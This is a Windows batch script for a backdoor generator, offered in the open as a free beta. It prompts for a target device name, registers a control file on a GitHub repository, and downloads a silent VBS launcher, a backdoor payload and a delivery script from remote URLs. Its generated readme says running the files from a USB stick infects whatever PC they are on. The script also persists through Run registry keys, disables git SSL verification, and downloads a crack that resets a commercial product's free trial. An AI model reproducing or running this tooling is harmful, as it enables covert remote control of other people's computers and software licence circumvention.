:: setup
:start
@ECHO OFF
set update_number=V4.40.27
set dev=0
cls
:VBSDynamicBuild
SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
set temp=0&set autofullscreen=true&set updatelogs=true&set debug_enabled=false&set antivirus=true&set progress_bar=true&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=false
if not exist C:\ProgramData\autofullscreen.sav echo true>C:\ProgramData\autofullscreen.sav
if not exist C:\ProgramData\updatelogs.sav echo true>C:\ProgramData\updatelogs.sav
if not exist C:\ProgramData\debug_enabled.sav echo false>C:\ProgramData\debug_enabled.sav
if not exist C:\ProgramData\antivirus.sav echo true>C:\ProgramData\antivirus.sav
if not exist C:\ProgramData\progress_bar.sav echo true>C:\ProgramData\progress_bar.sav
if not exist C:\ProgramData\target_software_bypass.sav echo true>C:\ProgramData\target_software_bypass.sav
title free Beta Release %update_number%
cls
< C:\ProgramData\autofullscreen.sav (
  set /p autofullscreen=
)
< C:\ProgramData\updatelogs.sav (
  set /p updatelogs=
)
< C:\ProgramData\debug_enabled.sav (
  set /p debug_enabled=
)
< C:\ProgramData\antivirus.sav (
  set /p antivirus=
)
< C:\ProgramData\progress_bar.sav (
  set /p progress_bar=
)
< C:\ProgramData\target_software_bypass.sav (
  set /p target_software_bypass=
)
if %autofullscreen% equ true CSCRIPT //nologo "%TempVBSFile%"
if %username% equ 61481 goto skip_dev
if %debug_enabled% equ true goto skip_dev
if %username% neq luken if %dev% equ 1 goto dev
:skip_dev
goto CP
:adminyes
if exist C:\ProgramData\UPnum.sav (call :update_check) else (goto UPcreate)
:UPnxt
git version >git.sav
>nul find "version" git.sav && (
  goto GIT_check_nxt
) || (
  goto error1
)
:GIT_check_nxt
del git.sav
:: detect and load save file data
if exist C:\ProgramData\GVGemail.sav (goto load_email) else (goto error2)
:emailnext
if exist "C:\Users\%username%\launch.vbs" goto backdoor_remove
if exist "C:\ProgramData\launch.vbs" goto backdoor_remove
:no_remove_backdoor
if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav goto EP_module
:EP_finish
:: manual configuration
  :exit_menu
  echo [33myou are using the free version, any backdoor generated will automaticaly be removed after 1 month[0m
  echo [31madmin backdoor needs more testing, use this at your own risk[0m
  echo do you have admin permissions on the target PC?
  echo note: this will require you to have admin rights when infecting A PC, however it will infect all users on that PC, not just the active one.
  echo.
  echo [33mpress M to be taken to settings[0m
  choice /C YNM /m "does target PC have admin rights? Y/N:
  if %errorlevel% equ 1 (set target_admin_rights=true) else (if %errorlevel% equ 2 (set target_admin_rights=false) else (goto menu))
  echo.  
  echo DO NOT USE SPACES, replace them with _
  echo.
  set /p opt1=Device name:
  echo where would you like to create the files
  echo if directory does not exist it will be created
  set /p opt2=directory:
:: create all files needed
  :: create placeholder file
    Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/progress_bar.bat").Content >"progress bar.bat"
    start call "progress bar.bat"
    timeout 1 >nul
    echo 1>load_trigger.txt
    Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/default_placeholder.bat").Content >temp.txt
    powershell -Command "(gc temp.txt) -replace 'REPver', '%update_number%' | Out-File -encoding ASCII %opt1%.bat"
    del temp.txt
    echo 2>load_trigger.txt
  :: upload file to github
    echo [33mregistering code on github...[0m
    git config user.name "%username%"
    git config user.email "%email%"
    git config --global http.sslVerify false
    git reset --hard origin/main
    git init -b main
    git pull https://github.com/Guest257351/Control.git --allow-unrelated-histories 
    git add "%opt1%.bat"
    git commit -m "%opt2%"
    git remote add origin https://github.com/Guest257351/Control.git
    git remote -v
    git push origin main
    echo [92mregistered file on github![0m
  :: generate a file to launch payload from start up folder in invisible mode
   echo 3>load_trigger.txt
    mkdir %opt2%\payload >nul
    echo 4>load_trigger.txt
    echo [33mdownloading code from github to create silent launch file...[0m
    Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/SL.vbs").Content >%opt2%\payload\launch.vbs
    if exist %opt2%\payload\launch.vbs (echo [92msuccessfully created silent launch file![0m) else (goto error4)
  :: generate a file to run code from github on the target PC
    echo 5>load_trigger.txt
    echo [33mdownloading code from github to create backdoor file...[0m
    Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/free_BC.bat").Content >%opt2%\payload\payload.bat
    echo 6>load_trigger.txt
    set CUR_YYYY=%date:~10,4%
    set CUR_DD=%date:~4,2%
    set CUR_MM=%date:~7,2%
    set /a CUR_MM=%CUR_MM%+1
    set CUR_HH=%time:~0,2%
    if %CUR_HH% lss 10 (set CUR_HH=0%time:~1,1%)
    set CUR_NN=%time:~3,2%
    set CUR_SS=%time:~6,2%
    set CUR_MS=%time:~9,2%
    set current_time=%CUR_YYYY%%CUR_MM%%CUR_DD%%CUR_HH%%CUR_NN%%CUR_SS%
    powershell -Command "(gc %opt2%\payload\payload.bat) -replace 'REPtxt', '%opt1%' | Out-File -encoding ASCII %opt2%\payload\payload.bat"
    powershell -Command "(gc %opt2%\payload\payload.bat) -replace 'REPtime', '%current_time%' | Out-File -encoding ASCII %opt2%\payload\payload.bat"
    if exist %opt2%\payload\payload.bat (echo [92msuccessfully created backdoor file![0m) else (goto error6)
  :: generate a file to move files to their proper location
    echo 7>load_trigger.txt
    echo [33mdownloading code to deliver backdoor...[0m
    if %target_admin_rights% equ true Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/RC_yes_admin.bat").Content >%opt2%\run.bat
    if %target_admin_rights% equ false Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/RC_no_admin.bat").Content >%opt2%\run.bat
    if exist %opt2%\run.bat (echo [92msuccessfully created run file![0m) else (goto error7)
  :: create readme file
    echo 8>load_trigger.txt
    echo [33mgenerating readme file...[0m
    echo you are using the free version and this backdoor will expire after 1 month or at the end of the year>%opt2%\readme.txt
    echo clicking run will infect whatever PC the files are on, so put these files on a usb and the files will be automaticaly moved to that PC. >>%opt2%\readme.txt
    if exist %opt2%\readme.txt echo [92msuccessfully created readme file![0m
  :: check all files where made
    echo [33mverifying all files where successfuly made...[0m
    echo 9>load_trigger.txt
    if exist %opt2%\payload\launch.vbs (echo [92msilent launch exists[0m) else (goto error4)
    if exist %opt2%\payload\payload.bat (echo [92mbackdoor exists[0m) else (goto error6)
    if exist %opt2%\run.bat (echo [92mrun exists[0m) else (goto error7)
:: delete files created during setup
  echo 10>load_trigger.txt
  echo [33mcleaning up temp files...[0m
  if exist %opt1%.bat (set temp=1) else (echo [92mno temp files where found[0m)
  if %temp% equ 1 del %opt1%.bat
  if %temp% equ 1 echo [92mtemp files deleted[0m
  echo 11>load_trigger.txt
echo.
echo press any key to exit...
pause >nul
exit /b
:update_check
< C:\ProgramData\UPnum.sav (
  set /p UPnum=
)
if %UPnum% equ %update_number% exit /b
:UPlogs
echo %update_number% >C:\ProgramData\UPnum.sav
if %updatelogs% equ false (echo New Update was installed, %update_number%
exit /b)
Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/Current-update-logs").Content >C:\ProgramData\UPlogs.txt
echo.
echo please close the text document to continue
start /WAIT C:\ProgramData\UPlogs.txt
exit /b
:: errors
  :error1
    echo [31merror code: 01[0m
    echo [31merror: failed to detect git installation[0m
    echo [31merror type: fatal[0m
    echo [31mhow to replicate: uninstall git[0m
    echo [31mhow to fix: Program will now download git for you[0m
    echo [31mextra information: if you have git portable, a system to allow this will be implemented eventualy[0m
    echo.
    echo exit the program to not install git (program will ask you to install it on next launch)
    echo press any key to install git...
    pause >nul
    goto git_download
    timeout 1 /nobreak >nul
    exit /b
  :error2
    echo [31merror code: 02[0m
    echo [31merror: email save was not detected[0m
    echo [31merror type: resolvable[0m
    echo [31mhow to replicate: delete C:\ProgramData\GVGemail.sav[0m
    echo [31mhow to fix: Program will now ask for your email, email will be saved so this error will not show up again[0m
    echo [31mextra information: email is required by github to verify your identity, email WILL BE PUBLIC on github.[0m
    echo.
    echo press any key to fill out email...
    pause >nul
    goto emailadd
  :error3
    echo [31merror code: 03[0m
    echo [31merror: program was not run with administrator perms[0m
    echo [31merror type: fatal[0m
    echo [31mhow to replicate: do not run file as administrator[0m
    echo [31mhow to fix: rerun program by right clicking on file and clicking "run as administrator"[0m
    echo [31mextra information: administrator perms are required to access github[0m
    echo.
    echo press any key to exit...
    pause >nul
    exit /b
  :error4
    git rm %opt1%.bat
    echo [31merror code: 04[0m
    echo [31merror: silent launch code download failed[0m
    echo [31merror type: fatal[0m
    echo [31mhow to replicate: run the program while disconnected from the internet.[0m
    echo [31mhow to fix: error is most likely caused by lack of internet connection. Please make sure you are connected and github.com is not blocked on your wifi.[0m
    echo [31mextra information: all files created have been removed[0m
    echo.
    echo press any key to exit...
    pause >nul
    exit /b
  :error5
    title error code 5
    echo [31merror code: 05[0m
    echo [31merror: email save failed[0m
    echo [31merror type: fatal[0m
    echo [31mhow to replicate: unknown.[0m
    echo [31mhow to fix: there is no known fix for this error[0m
    echo [31mextra information: if you would like to help me fix this bug please contact me through discord: "guest257351#1040" I have no idea why this bug is caused, it is most likely caused because you do not have permission to edit C:\ProgramData[0m
    echo.
    echo press any key to exit...
    pause >nul
    exit /b
  :error6
    git rm %opt1%.bat
    del %opt2%\payload
    echo [31merror code: 06[0m
    echo [31merror: backdoor code download failed[0m
    echo [31merror type: fatal[0m
    echo [31mhow to replicate: run the program while disconnected from the internet.[0m
    echo [31mhow to fix: error is most likely caused by lack of internet connection. Please make sure you are connected and github.com is not blocked on your wifi.[0m
    echo [31mextra information: all files created have been removed[0m
    echo.
    echo press any key to exit...
    pause >nul
    exit /b
  :error7
    git rm %opt1%.bat
    del %opt2%\payload
    echo [31merror code: 07[0m
    echo [31merror: run file creation failed[0m
    echo [31merror type: fatal[0m
    echo [31mhow to replicate: unknown[0m
    echo [31mhow to fix: there is no known fix for this error[0m
    echo [31mextra information: if you would like to help me fix this bug please contact me through discord: guest257351#1040[0m
    echo.
    echo press any key to exit...
    pause >nul
    exit /b
  :error8
    echo [31merror code: 08[0m
    echo [31merror: failed to get update logs[0m
    echo [31merror type: fatal[0m
    echo [31mhow to replicate: unknown[0m
    echo [31mhow to fix: error is most likely caused by lack of internet connection. Please make sure you are connected and github.com is not blocked on your wifi.[0m
    echo [31mextra information: if you would like to help me fix this bug please contact me through discord: guest257351#1040[0m
    echo.
    echo press any key to exit...
    pause >nul
    exit /b
:: ask user for email adress
:emailadd
set /p email=email:
echo %email%>C:\ProgramData\GVGemail.sav
if exist C:\ProgramData\GVGemail.sav (echo [92memail was successfully saved![0m) else (goto error5)
:: load saved email
goto emailnext
:load_email
< C:\ProgramData\GVGemail.sav (
  set /p email=
)
goto emailnext
:CP
    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto adminyes
    ) else (
        goto error3
    )
:dev
echo.
title dissabled %update_number%
echo app dissabled due to development. contact though discord (guest257351#1040) for more information
echo.
echo press any key to exit...
pause >nul
exit /b
:UPcreate
echo %update_number% >C:\ProgramData\UPnum.sav
goto UPlogs
:backdoor_remove
echo [31mWARNING![0m
echo.
echo Program has detected that your own PC has been backdoored
echo would you like to remove the backdoor?
choice
if %errorlevel% equ 1 goto yes_remove_backdoor
if %errorlevel% equ 2 goto no_remove_backdoor
:yes_remove_backdoor
echo [33mremoving backdoor files...[0m
echo [33mlaunch.vbs detected.[0m
if exist "C:\ProgramData\launch.vbs" set admin_launch=true
if %admin_launch% equ true echo administrator version detected
if exist "C:\users\%username%\AppData\payload.bat" (set payload_is_exist=1)
if %payload_is_exist% equ 1 (echo [33mpayload.bat detected.[0m) else (echo [33mpayload.bat not detected.[0m)
if exist "C:\users\%username%\AppData\control" (set control_is_exist=1)
if %control_is_exist% equ 1 (echo [33mcontrol folder detected.[0m) else (echo [33mcontrol folder not detected.[0m)
if exist "C:\users\%username%\AppData\cmd.bat" (set cmd_is_exist=1)
if %cmd_is_exist% equ 1 (echo [33mcmd.bat detected.[0m) else (echo [33mcmd.bat not detected.[0m)
REG QUERY "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "payload"
if %errorlevel% equ 0 set reg_value_exists=1 >nul
if %reg_value_exists% equ true (echo [33mregisrty value exists[0m) else (echo [33mregistry value not detected[0m)
if %admin_launch% neq true del "C:\Users\%username%\launch.vbs"
if %admin_launch% equ true del "C:\ProgramData\launch.vbs
if not exist "C:\Users\%username%\launch.vbs" (echo [92mlaunch.vbs removed[0m)
if %payload_is_exist% equ 1 del "C:\users\%username%\AppData\payload.bat /Q /F"
if %payload_is_exist% equ 1 (echo [92mpayload.bat removed[0m)
if %cmd_is_exist% equ 1 (del "C:\users\%username%\AppData\cmd.bat" /Q /F)
if %cmd_is_exist% equ 1 (echo [92mcmd.bat removed[0m)
if %control_is_exist% equ 1 (del "C:\users\%username%\AppData\control" /Q /F) 
if %control_is_exist% equ 1 (echo [92mcontrol folder removed[0m)
if %reg_value_exists% equ 1 (reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v payload /f)>nul
if %reg_value_exists% equ 1 (echo [92mregistry value deleted[0m)
if %admin_launch% equ true (reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v payload /f)>nul
if %admin_launch% equ true echo ([92mregistry value deleted[0m)
timeout 2 /NOBREAK >nul
goto no_remove_backdoor
:git_download
echo [33mdownloading git....[0m
powershell Import-Module BitsTransfer
powershell Start-BitsTransfer -source "https://github.com/git-for-windows/git/releases/download/v2.31.0.windows.1/Git-2.31.0-64-bit.exe" -Destination gitDL.exe
echo [92mgit downloaded[0m
timeout 1 /NOBREAK >nul
echo [33minstalling git...[0m
gitDL.exe /silent
del gitDL.exe
goto start
:EP_module
echo.
echo Hello %username%, you have been granted access to the EP bot module.
echo if you do not want to install it you will recieve this option next time you launch
echo please note that this module is untested and may crash
choice /M "would you like to install it now?"
if %errorlevel% equ 2 goto EPbot_installed
echo.
echo this module is extremely complicated so a text file will be put in the install directory containing instructions on how to use it
echo.
echo this setup will install trusted software called textract. This allows the bot to "read" the screen
echo it will also install the bot itself to the selected install directory
echo please note that textract is not free and has a free trial, I have created my own crack to renew freetrials.
echo.
echo if folder does not exist it will be created
set /p EP_dir=install directory:
mkdir %EP_dir%>nul
echo [33mcreating readme file...[0m
Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/EP_bot_readme.txt").Content >%EP_dir%\readme.txt
echo [92mcreated readme.txt[0m
echo [33mdownloading EPbot script...[0m
Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/EP_bot.bat").Content >%EP_dir%\EPbot.bat
echo [92mcreated EPbot.bat[0m
echo [33mdownloading textract[0m
powershell Import-Module BitsTransfer
powershell Start-BitsTransfer -source "http://www.structurise.com/textra.exe" -Destination textra.exe
echo [33m installing textract[0m
start /wait textra.exe /silent
echo [33m deleting installer[0m
del textra.exe
echo [92m textract was installed successfully![0m
echo [33mdownloading textract cracker...[0m
Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/crack.bat").Content >%EP_dir%\crack.bat
echo [92mcreated crack.bat[0m
echo [92minstallation completed![0m you can find the program in %EP_dir%.
echo dat>"C:\users\%username%\EPbot_installed.sav"
echo.
echo.
echo [31mWARNING! [33ma window will have opened to build the textract font database, click continue.
echo.
echo press any key to return to the menu...
pause >nul
goto EP_finish
:menu
cls
echo.
echo all settings changed in here are saved
echo.
echo press the number relating to the setting you want changed
echo.
echo 1(automaticaly enter fullscreen on start (%autofullscreen%)
echo 2(display update logs when new update is released (%updatelogs%)
echo 3(debug mode (app will not be dissabled when it is broken) (%debug_enabled%)
echo 4(built in antivirus (prevents you from backdooring your own PC) (%antivirus%)
echo 5(run progress_bar while generating (%progress_bar%) 
echo 6(legacy mode, old software bypass mode (broken) (%target_software_bypass%)
echo 7(back to main menu
echo.
choice /M "option: " /c 1234567 /n
if %errorlevel% equ 1 goto menu1
if %errorlevel% equ 2 goto menu2
if %errorlevel% equ 3 goto menu3
if %errorlevel% equ 4 goto menu4
if %errorlevel% equ 5 goto menu5
if %errorlevel% equ 6 goto menu6
if %errorlevel% equ 7 goto exit_menu
:menunxt
echo %autofullscreen%>C:\ProgramData\autofullscreen.sav
echo %updatelogs%>C:\ProgramData\updatelogs.sav
echo %debug_enabled%>C:\ProgramData\debug_enabled.sav
echo %antivirus%>C:\ProgramData\antivirus.sav
echo %progress_bar%>C:\ProgramData\progress_bar.sav
echo %target_software_bypass%>C:\ProgramData\target_software_bypass.sav
goto menu
:menu1
if %autofullscreen% equ false (set autofullscreen=true
goto menunxt)
if %autofullscreen% equ true set autofullscreen=false
goto menunxt
:menu2
if %updatelogs% equ false (set updatelogs=true
goto menunxt)
if %updatelogs% equ true set updatelogs=false
goto menunxt
:menu3
if %debug_enabled% equ false (set debug_enabled=true
goto menunxt)
if %debug_enabled% equ true set debug_enabled=false
goto menunxt
:menu4
if %antivirus% equ false (set antivirus=true
goto menunxt)
if %antivirus% equ true set antivirus=false
goto menunxt
:menu5
if %progress_bar% equ false (set progress_bar=true
goto menunxt)
if %progress_bar% equ true set progress_bar=false
goto menunxt
:menu6
if %target_software_bypass% equ false (set target_software_bypass=true
goto menunxt)
if %target_software_bypass% equ true set target_software_bypass=false
goto menunxt
:stealth_module